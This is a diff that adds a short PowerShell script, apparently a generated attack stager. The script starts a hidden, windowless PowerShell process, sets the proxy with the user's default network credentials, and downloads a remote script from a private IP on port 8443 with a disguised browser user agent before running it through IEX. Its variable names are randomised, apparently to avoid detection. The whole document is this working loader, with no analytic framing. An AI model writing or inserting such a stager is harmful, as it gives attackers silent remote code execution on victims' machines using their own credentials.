@@ -1,0 +1,17 @@
+if([IntPtr]::Size -eq 4){
+		$AlbinoSvEF=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe';
+	}else{
+		$AlbinoSvEF='powershell.exe';
+	};
+	
+$ZDFdbhSMICROSOFT=New-Object System.Diagnostics.ProcessStartInfo;
+$ZDFdbhSMICROSOFT.FileName=$AlbinoSvEF;
+$ZDFdbhSMICROSOFT.Arguments="[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();
+							[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;
+							IWR http://192.168.178.27:8443/psh-custom-template.ps1 -UserAgent 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'|IEX";
+
+$ZDFdbhSMICROSOFT.UseShellExecute=$false;
+$ZDFdbhSMICROSOFT.RedirectStandardOutput=$true;
+$ZDFdbhSMICROSOFT.WindowStyle='Hidden';
+$ZDFdbhSMICROSOFT.CreateNoWindow=$true;
+$p=[System.Diagnostics.Process]::Start($ZDFdbhSMICROSOFT);
